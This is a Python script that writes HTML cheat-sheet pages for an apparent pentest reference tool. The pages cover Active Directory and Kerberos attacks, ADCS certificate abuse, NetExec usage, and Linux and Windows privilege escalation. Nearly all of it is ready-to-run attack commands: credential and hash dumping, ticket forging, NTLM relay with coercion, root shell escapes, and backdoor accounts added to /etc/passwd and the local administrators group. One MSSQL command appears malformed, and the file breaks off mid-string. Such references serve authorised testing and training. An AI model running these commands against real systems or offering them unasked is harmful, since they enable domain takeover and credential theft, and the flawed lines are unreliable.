#!/usr/bin/env python3
"""
p3ta-tricks built-in reference content writer.

Creates JSON pages in content/processed/reference/ for:
  - ad-kerberos    (AD / Kerberos attack cheat sheet)
  - adcs           (AD Certificate Services ESC1-ESC8)
  - nxc-reference  (NetExec / CrackMapExec)
  - linux-privesc  (Linux privilege escalation)
  - windows-privesc(Windows privilege escalation)

Run: python3 scripts/add_content.py
"""

import json
import sys
from pathlib import Path

SCRIPT_DIR = Path(__file__).parent.resolve()
PROJECT_DIR = SCRIPT_DIR.parent
REF_DIR = PROJECT_DIR / "content" / "processed" / "reference"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _write(name: str, data: dict) -> None:
    REF_DIR.mkdir(parents=True, exist_ok=True)
    out = REF_DIR / f"{name}.json"
    with out.open("w", encoding="utf-8") as fh:
        json.dump(data, fh, ensure_ascii=False, indent=2)
    print(f"  wrote {out.relative_to(PROJECT_DIR)}")


def _page(
    name: str,
    title: str,
    category: str,
    subcategory: str,
    html: str,
    tags: list[str],
) -> dict:
    plain = ""
    import re
    plain_raw = re.sub(r"<[^>]+>", " ", html)
    plain_raw = re.sub(r"\s+", " ", plain_raw).strip()
    excerpt = plain_raw[:300].rsplit(" ", 1)[0] + "…" if len(plain_raw) > 300 else plain_raw
    return {
        "title": title,
        "category": category,
        "subcategory": subcategory,
        "path": f"reference/{name}",
        "html": html,
        "excerpt": excerpt,
        "tags": tags,
    }


# ---------------------------------------------------------------------------
# AD / Kerberos
# ---------------------------------------------------------------------------

AD_KERBEROS_HTML = r"""\
<h2 id="ad-kerberos">Active Directory &amp; Kerberos Attacks</h2>

<h3 id="asreproast">ASREPRoast</h3>
<p>Targets accounts with pre-authentication disabled (<code>DONT_REQ_PREAUTH</code>).
Retrieves AS-REP tickets crackable offline.</p>
<div class="code-block">
<pre><code class="language-bash"># Enumerate + dump — no creds required
impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip &lt;DC_IP&gt;

# With valid credentials (enumerate automatically)
impacket-GetNPUsers &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; -request -format hashcat

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force</code></pre>
</div>

<h3 id="kerberoast">Kerberoast</h3>
<p>Request TGS tickets for service accounts (SPNs set). Tickets are encrypted with the
service account's NTLM hash — crackable offline.</p>
<div class="code-block">
<pre><code class="language-bash"># Dump all Kerberoastable hashes
impacket-GetUserSPNs &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; -request -outputfile kerberoast.txt

# AES-only accounts (SUPPORTED_ENCRYPTION_TYPES)
impacket-GetUserSPNs &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; -request -target-domain &lt;DOMAIN&gt;

# Crack (mode 13100 = RC4, 19700 = AES128, 19800 = AES256)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force</code></pre>
</div>

<h3 id="pass-the-hash">Pass-the-Hash (PtH)</h3>
<p>Authenticate using an NTLM hash instead of a plaintext password. Works where NTLMv2 is
accepted (SMB, WinRM, RDP with restricted admin).</p>
<div class="code-block">
<pre><code class="language-bash"># PSExec
impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;TARGET_IP&gt; -hashes :&lt;NTHASH&gt;

# WMIExec (less noisy — no service creation)
impacket-wmiexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;TARGET_IP&gt; -hashes :&lt;NTHASH&gt;

# SMBExec
impacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;TARGET_IP&gt; -hashes :&lt;NTHASH&gt;

# NetExec spray
nxc smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTHASH&gt; --local-auth</code></pre>
</div>

<h3 id="pass-the-ticket">Pass-the-Ticket (PtT)</h3>
<p>Inject a Kerberos ticket (TGT or TGS) into the current session to impersonate a user.</p>
<div class="code-block">
<pre><code class="language-bash"># Set ticket env var (Linux / impacket)
export KRB5CCNAME=/path/to/&lt;ticket.ccache&gt;

# Use with impacket
impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;TARGET_IP&gt; -k -no-pass

# Dump TGT with secretsdump or mimikatz, convert if needed
impacket-ticketConverter ticket.kirbi ticket.ccache

# faketime for clock skew (&gt;5 min diff kills Kerberos)
faketime "$(ntpdate -q &lt;DC_IP&gt; 2&gt;/dev/null | awk '{print $1,$2}')" \\
    impacket-psexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;TARGET_IP&gt; -k -no-pass</code></pre>
</div>

<h3 id="overpass-the-hash">Overpass-the-Hash (Pass-the-Key)</h3>
<p>Use an NTLM hash or AES key to request a TGT (converting PtH into a full Kerberos session).</p>
<div class="code-block">
<pre><code class="language-bash"># RC4 (NTLM hash)
impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt; -hashes :&lt;NTHASH&gt; -dc-ip &lt;DC_IP&gt;
export KRB5CCNAME=&lt;USERNAME&gt;.ccache

# AES256 key
impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt; -aesKey &lt;AES256_KEY&gt; -dc-ip &lt;DC_IP&gt;</code></pre>
</div>

<h3 id="dcsync">DCSync</h3>
<p>Simulate a DC replication request to extract all password hashes. Requires
<em>DS-Replication-Get-Changes-All</em> (typically Domain Admin or delegated).</p>
<div class="code-block">
<pre><code class="language-bash"># Dump all hashes
impacket-secretsdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC_IP&gt;

# Dump specific user
impacket-secretsdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC_IP&gt; -just-dc-user administrator

# PtH variant
impacket-secretsdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt; -hashes :&lt;NTHASH&gt;

# PtT variant
KRB5CCNAME=admin.ccache impacket-secretsdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt; -k -no-pass</code></pre>
</div>

<h3 id="bloodhound">BloodHound Collection</h3>
<div class="code-block">
<pre><code class="language-bash"># Python collector (Linux)
bloodhound-python -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; -dc &lt;DC_IP&gt; -c All --zip

# PtH variant
bloodhound-python -u &lt;USERNAME&gt; --hashes :&lt;NTHASH&gt; -d &lt;DOMAIN&gt; -dc &lt;DC_IP&gt; -c All --zip

# SharpHound (Windows)
SharpHound.exe -c All --zipfilename bh.zip</code></pre>
</div>

<h3 id="silver-ticket">Silver Ticket</h3>
<p>Forge a TGS for a specific service using the service account's NTLM hash. No DC contact — works offline.</p>
<div class="code-block">
<pre><code class="language-bash"># Get domain SID first
impacket-getPac &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -targetUser &lt;USERNAME&gt;

# Forge silver ticket (CIFS service)
impacket-ticketer -nthash &lt;SERVICE_NTHASH&gt; -domain-sid &lt;DOMAIN_SID&gt; \\
    -domain &lt;DOMAIN&gt; -spn cifs/&lt;TARGET_HOST&gt; &lt;USERNAME&gt;

export KRB5CCNAME=&lt;USERNAME&gt;.ccache
impacket-smbclient &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;TARGET_HOST&gt; -k -no-pass</code></pre>
</div>

<h3 id="golden-ticket">Golden Ticket</h3>
<p>Forge a TGT using the <code>krbtgt</code> NTLM hash. Full domain compromise — impersonate any user.</p>
<div class="code-block">
<pre><code class="language-bash">impacket-ticketer -nthash &lt;KRBTGT_NTHASH&gt; -domain-sid &lt;DOMAIN_SID&gt; \\
    -domain &lt;DOMAIN&gt; administrator

export KRB5CCNAME=administrator.ccache
impacket-psexec &lt;DOMAIN&gt;/administrator@&lt;DC_IP&gt; -k -no-pass</code></pre>
</div>

<h3 id="delegation-attacks">Delegation Attacks</h3>
<div class="code-block">
<pre><code class="language-bash"># Find unconstrained delegation
impacket-findDelegation &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt;

# RBCD — write msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-from &lt;ATTACKER_COMPUTER&gt;$ -delegate-to &lt;TARGET_COMPUTER&gt;$ \\
    -dc-ip &lt;DC_IP&gt; -action write &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;

# Get impersonation TGS
impacket-getST -spn cifs/&lt;TARGET_FQDN&gt; -impersonate administrator \\
    -dc-ip &lt;DC_IP&gt; &lt;DOMAIN&gt;/&lt;ATTACKER_COMPUTER&gt;$:&lt;PASSWORD&gt;</code></pre>
</div>
"""

# ---------------------------------------------------------------------------
# ADCS
# ---------------------------------------------------------------------------

ADCS_HTML = r"""\
<h2 id="adcs">Active Directory Certificate Services (ADCS)</h2>
<p>Reference: <a href="https://github.com/ly4k/Certipy" target="_blank">Certipy</a> /
<a href="https://github.com/GhostPack/Certify" target="_blank">Certify</a>.
Find vulnerable templates with <code>certipy find</code> then exploit with <code>certipy req</code>.</p>

<h3 id="adcs-enum">Enumeration</h3>
<div class="code-block">
<pre><code class="language-bash"># Enumerate CAs and templates (saves .txt + .json + .zip)
certipy find -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt;

# Only show vulnerable templates
certipy find -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; -vulnerable -stdout</code></pre>
</div>

<h3 id="esc1">ESC1 — SAN Specification by Enrollee</h3>
<p>Template allows the enrollee to supply a <em>Subject Alternative Name</em> (SAN).
Request a cert as any principal (e.g. Administrator).</p>
<div class="code-block">
<pre><code class="language-bash">certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -template &lt;TEMPLATE&gt; \\
    -upn administrator@&lt;DOMAIN&gt;

# Authenticate with the cert → get TGT + NTLM hash
certipy auth -pfx administrator.pfx -dc-ip &lt;DC_IP&gt;</code></pre>
</div>

<h3 id="esc2">ESC2 — Any Purpose / No EKU</h3>
<p>Template has "Any Purpose" EKU or no EKU — can be used as a smart card cert.</p>
<div class="code-block">
<pre><code class="language-bash">certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -template &lt;TEMPLATE&gt;

# Use the resulting cert to request another cert on behalf of admin
certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -template User \\
    -on-behalf-of &lt;DOMAIN&gt;\\administrator -pfx &lt;USERNAME&gt;.pfx</code></pre>
</div>

<h3 id="esc3">ESC3 — Enrollment Agent Abuse</h3>
<p>Enroll as an Enrollment Agent, then request a certificate on behalf of another user.</p>
<div class="code-block">
<pre><code class="language-bash"># Step 1: get enrollment agent cert
certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -template &lt;EA_TEMPLATE&gt;

# Step 2: request on behalf of administrator
certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -template User \\
    -on-behalf-of &lt;DOMAIN&gt;\\administrator -pfx &lt;USERNAME&gt;.pfx</code></pre>
</div>

<h3 id="esc4">ESC4 — Vulnerable Template ACL</h3>
<p>Write permission on a template. Modify it to be ESC1-exploitable, then restore.</p>
<div class="code-block">
<pre><code class="language-bash"># Save original + overwrite template to allow SAN
certipy template -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -template &lt;TEMPLATE&gt; -save-old

# Now exploit as ESC1
certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -template &lt;TEMPLATE&gt; \\
    -upn administrator@&lt;DOMAIN&gt;

# Restore the template
certipy template -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -template &lt;TEMPLATE&gt; -configuration &lt;TEMPLATE&gt;.json</code></pre>
</div>

<h3 id="esc6">ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA</h3>
<p>The CA has the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag set — any template that allows
client auth can be abused to request a cert with an arbitrary SAN.</p>
<div class="code-block">
<pre><code class="language-bash">certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -template User \\
    -upn administrator@&lt;DOMAIN&gt;</code></pre>
</div>

<h3 id="esc7">ESC7 — Vulnerable CA ACL</h3>
<p>Principal has <em>ManageCA</em> or <em>ManageCertificates</em> rights on the CA itself.</p>
<div class="code-block">
<pre><code class="language-bash"># Add yourself as officer (ManageCertificates)
certipy ca -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -ca &lt;CA_NAME&gt; -add-officer &lt;USERNAME&gt;

# Enable a vulnerable template (e.g. SubCA)
certipy ca -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -ca &lt;CA_NAME&gt; -enable-template SubCA

# Request + approve manually denied cert
certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -template SubCA \\
    -upn administrator@&lt;DOMAIN&gt;
# Note the request ID from output, then:
certipy ca -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -ca &lt;CA_NAME&gt; -issue-request &lt;REQUEST_ID&gt;
certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -retrieve &lt;REQUEST_ID&gt;</code></pre>
</div>

<h3 id="esc8">ESC8 — NTLM Relay to AD CS HTTP Endpoint</h3>
<p>Relay NTLM authentication to the CA's Web Enrollment endpoint (<code>/certsrv/certfnsh.asp</code>)
to obtain a certificate for a machine account or privileged user.</p>
<div class="code-block">
<pre><code class="language-bash"># Start relay (impacket)
impacket-ntlmrelayx -t http://&lt;CA_HOST&gt;/certsrv/certfnsh.asp \\
    --adcs --template &lt;TEMPLATE&gt; -smb2support

# Trigger coercion (PetitPotam / PrinterBug / Coercer)
python3 PetitPotam.py -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;ATTACKER_IP&gt; &lt;DC_IP&gt;
# or
Coercer coerce -l &lt;ATTACKER_IP&gt; -t &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;

# Convert b64 cert output → PFX
echo -n "&lt;BASE64_CERT&gt;" | base64 -d &gt; dc.pfx

# Authenticate (get TGT + NTLM hash of DC machine account)
certipy auth -pfx dc.pfx -dc-ip &lt;DC_IP&gt;

# DCSync using machine account
impacket-secretsdump &lt;DOMAIN&gt;/&lt;DC_MACHINE&gt;\$@&lt;DC_IP&gt; -hashes :&lt;DC_NTHASH&gt;</code></pre>
</div>

<h3 id="esc13">ESC13 — OID Group Link</h3>
<p>Certificate template is linked to an OID group that grants additional AD group membership
upon authentication. Enroll to gain the linked group's privileges.</p>
<div class="code-block">
<pre><code class="language-bash"># Enumerate OID group links
certipy find -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; -vulnerable -stdout

# Enroll in the linked template (no SAN needed — enrollment is the privilege)
certipy req -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -dc-ip &lt;DC_IP&gt; \\
    -target &lt;CA_HOST&gt; -ca &lt;CA_NAME&gt; -template &lt;TEMPLATE&gt;

# Authenticate — the resulting TGT carries the OID group PAC entry
certipy auth -pfx &lt;USERNAME&gt;.pfx -dc-ip &lt;DC_IP&gt;</code></pre>
</div>

<h3 id="cert-to-hash">Cert → NTLM Hash (PKINIT)</h3>
<div class="code-block">
<pre><code class="language-bash">certipy auth -pfx &lt;USERNAME&gt;.pfx -dc-ip &lt;DC_IP&gt;
# Outputs: TGT saved to &lt;USERNAME&gt;.ccache + NTLM hash printed</code></pre>
</div>
"""

# ---------------------------------------------------------------------------
# NXC / CrackMapExec
# ---------------------------------------------------------------------------

NXC_HTML = r"""\
<h2 id="nxc">NetExec (nxc) / CrackMapExec Cheat Sheet</h2>
<p><code>nxc</code> is the maintained fork of CrackMapExec. Syntax is identical; replace
<code>crackmapexec</code> / <code>cme</code> with <code>nxc</code>.</p>

<h3 id="nxc-smb">SMB</h3>
<div class="code-block">
<pre><code class="language-bash"># Password spray (lockout-safe: --no-bruteforce with user=pass)
nxc smb &lt;TARGET_IP&gt;/24 -u users.txt -p passwords.txt --continue-on-success
nxc smb &lt;TARGET_IP&gt; -u users.txt -p users.txt --no-bruteforce   # user=pass spray

# Pass-the-Hash
nxc smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTHASH&gt;
nxc smb &lt;TARGET_IP&gt;/24 -u administrator -H &lt;NTHASH&gt; --local-auth

# Enumerate shares
nxc smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --shares

# List users
nxc smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users

# Dump SAM (local accounts)
nxc smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --sam

# Dump LSA secrets
nxc smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --lsa

# DCSync via NTDS (requires DA)
nxc smb &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --ntds

# Execute command
nxc smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -x "whoami /all"

# Enable + abuse xp_cmdshell via SMB auth to MSSQL (see MSSQL section)

# Rid-brute (enumerate local users without creds)
nxc smb &lt;TARGET_IP&gt; -u '' -p '' --rid-brute

# Spider shares for interesting files
nxc smb &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -M spider_plus</code></pre>
</div>

<h3 id="nxc-winrm">WinRM</h3>
<div class="code-block">
<pre><code class="language-bash"># Test auth (Pwn3d! = can get shell)
nxc winrm &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;

# Interactive shell
evil-winrm -i &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;
evil-winrm -i &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -H &lt;NTHASH&gt;

# Execute command
nxc winrm &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -x "whoami"</code></pre>
</div>

<h3 id="nxc-ldap">LDAP</h3>
<div class="code-block">
<pre><code class="language-bash"># Enumerate users
nxc ldap &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users

# Enumerate groups
nxc ldap &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --groups

# ASREPRoast via LDAP
nxc ldap &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --asreproast asrep.txt

# Kerberoast via LDAP
nxc ldap &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --kerberoasting kerb.txt

# BloodHound collection
nxc ldap &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --bloodhound -c All

# Password-not-required accounts
nxc ldap &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --password-not-required

# AdminCount=1 accounts
nxc ldap &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --admin-count</code></pre>
</div>

<h3 id="nxc-mssql">MSSQL</h3>
<div class="code-block">
<pre><code class="language-bash"># Auth test
nxc mssql &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;

# Execute SQL query
nxc mssql &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -q "SELECT @@version"

# Enable xp_cmdshell
nxc mssql &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --put-file xp_cmdshell 1

# Execute OS command
nxc mssql &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -x "whoami"

# List databases
nxc mssql &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -q "SELECT name FROM sys.databases"</code></pre>
</div>

<h3 id="nxc-ssh">SSH</h3>
<div class="code-block">
<pre><code class="language-bash">nxc ssh &lt;TARGET_IP&gt;/24 -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --continue-on-success
nxc ssh &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -x "id"</code></pre>
</div>

<h3 id="nxc-ftp">FTP</h3>
<div class="code-block">
<pre><code class="language-bash">nxc ftp &lt;TARGET_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;
nxc ftp &lt;TARGET_IP&gt; -u anonymous -p anonymous</code></pre>
</div>
"""

# ---------------------------------------------------------------------------
# Linux PrivEsc
# ---------------------------------------------------------------------------

LINUX_PRIVESC_HTML = r"""\
<h2 id="linux-privesc">Linux Privilege Escalation</h2>

<h3 id="linux-enum">Initial Enumeration</h3>
<div class="code-block">
<pre><code class="language-bash">id && whoami
sudo -l
find / -perm -4000 -type f 2&gt;/dev/null        # SUID binaries
find / -perm -2000 -type f 2&gt;/dev/null        # SGID binaries
getcap -r / 2&gt;/dev/null                       # Capabilities
cat /etc/crontab; ls -la /etc/cron.*          # Cron jobs
ss -tlnp                                      # Internal services
cat /etc/passwd | grep -v nologin             # Users with shells
ls -la /home/*/.ssh/ /root/.ssh/ 2&gt;/dev/null # SSH keys
find / -writable -type f 2&gt;/dev/null | grep -v proc | grep -v sys
env; cat ~/.bash_history 2&gt;/dev/null | tail -50</code></pre>
</div>

<h3 id="sudo-abuse">sudo -l Abuse Patterns</h3>
<div class="code-block">
<pre><code class="language-bash"># ANY command as root
sudo su -
sudo /bin/bash

# File read (e.g. sudo less, sudo vim, sudo nano)
sudo less /etc/shadow    # !sh within less
sudo vim -c ':!/bin/sh'

# Text editors — shell escape
# vim:    :set shell=/bin/bash | :shell
# nano:   ^R^X then: reset; sh 1&gt;&amp;0 2&gt;&amp;0
# less:   !sh

# Scripting languages
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'

# (ALL, !root) bypass — CVE-2019-14287 (sudo &lt; 1.8.28)
sudo -u#-1 /bin/bash

# NOPASSWD service restart → writable service file
sudo /usr/bin/systemctl restart &lt;SERVICE&gt;
# If you can write the service unit: ExecStart=/tmp/shell.sh

# env_keep / LD_PRELOAD
# If env_keep+=LD_PRELOAD is set:
# cat &gt; /tmp/pe.c &lt;&lt;'EOF'
# #include &lt;stdio.h&gt;
# #include &lt;sys/types.h&gt;
# #include &lt;stdlib.h&gt;
# void _init() { unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash"); }
# EOF
# gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
# sudo LD_PRELOAD=/tmp/pe.so &lt;ALLOWED_COMMAND&gt;</code></pre>
</div>

<h3 id="suid-binaries">SUID Binary Abuse (GTFOBins)</h3>
<div class="code-block">
<pre><code class="language-bash"># find
find . -exec /bin/bash -p \; -quit

# cp — overwrite /etc/passwd or /etc/shadow
cp /etc/passwd /tmp/passwd.bak
echo 'root2::0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
su root2

# nmap (older versions with --interactive)
nmap --interactive
nmap&gt; !sh

# base64 — read files as root
base64 /etc/shadow | base64 -d

# python/perl/ruby/node — if SUID set (rare)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# pkexec — CVE-2021-4034 (PwnKit) — works on most distros
# https://github.com/ly4k/PwnKit
./PwnKit</code></pre>
</div>

<h3 id="cron-abuse">Cron Job Abuse</h3>
<div class="code-block">
<pre><code class="language-bash"># Monitor cron executions
pspy64   # https://github.com/DominicBreuker/pspy

# Writable script executed by root cron
echo 'chmod +s /bin/bash' &gt;&gt; /path/to/cron/script.sh
# Then: /bin/bash -p

# PATH injection — if cron uses relative commands
# Add /tmp to front of PATH and create malicious binary
echo '#!/bin/bash\nchmod +s /bin/bash' &gt; /tmp/&lt;COMMAND_NAME&gt;
chmod +x /tmp/&lt;COMMAND_NAME&gt;

# Wildcard injection (tar, rsync, chown)
# e.g. cron: tar czf backup.tgz /opt/backup/*
echo "" &gt; "--checkpoint=1"
echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash\nchmod +s /bin/bash' &gt; shell.sh</code></pre>
</div>

<h3 id="capabilities">Capabilities (cap_setuid)</h3>
<div class="code-block">
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null

# python3 with cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid+ep
perl -e 'use POSIX (setuid); setuid(0); exec "/bin/bash";'

# node with cap_setuid+ep
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# tar with cap_dac_read_search
tar -cvf /dev/null --checkpoint=1 --checkpoint-action=exec="cat /etc/shadow"</code></pre>
</div>

<h3 id="docker-escape">Docker / LXD Escape</h3>
<div class="code-block">
<pre><code class="language-bash"># Check group membership
id | grep -E 'docker|lxd|disk'

# Docker socket access → root on host
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Docker privileged escape
docker run --privileged --rm -it alpine sh
mount /dev/sda1 /mnt   # mount host root FS

# LXD escape (if user is in lxd group)
# https://www.exploit-db.com/exploits/46978
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
chroot /mnt/root bash</code></pre>
</div>

<h3 id="writable-paths">Writable Path / Library Hijacking</h3>
<div class="code-block">
<pre><code class="language-bash"># Shared object hijacking
ldd &lt;SUID_BINARY&gt;                        # find missing .so
strace &lt;SUID_BINARY&gt; 2&gt;&amp;1 | grep "No such"
# Create malicious .so in writable path that appears in ldconfig / RPATH

# Python library hijacking
# If a root cron script imports a module from a writable path:
echo 'import os; os.system("chmod +s /bin/bash")' &gt; /writable/path/&lt;MODULE&gt;.py

# PATH hijacking
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\nchmod +s /bin/bash' &gt; /tmp/&lt;EXPECTED_COMMAND&gt;
chmod +x /tmp/&lt;EXPECTED_COMMAND&gt;</code></pre>
</div>
"""

# ---------------------------------------------------------------------------
# Windows PrivEsc
# ---------------------------------------------------------------------------

WINDOWS_PRIVESC_HTML = r"""\
<h2 id="windows-privesc">Windows Privilege Escalation</h2>

<h3 id="win-enum">Initial Enumeration</h3>
<div class="code-block">
<pre><code class="language-powershell">whoami /all                          # privileges + groups
net user %username%
net localgroup administrators
systeminfo | findstr /B /C:"OS"
wmic qfe list brief                  # installed patches
Get-HotFix | Sort-Object InstalledOn | Select-Object -Last 10
sc query                             # running services
netstat -ano                         # listening ports
tasklist /SVC                        # processes
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
</div>

<h3 id="seimpersonate">SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege</h3>
<p>Common on IIS, MSSQL service accounts. Use Potato exploits to escalate to SYSTEM.</p>
<div class="code-block">
<pre><code class="language-powershell"># Check
whoami /priv | findstr Impersonate

# GodPotato (works on Server 2012 → 2022, Win 10/11)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user hacker P@ss123! /add &amp;&amp; net localgroup administrators hacker /add"

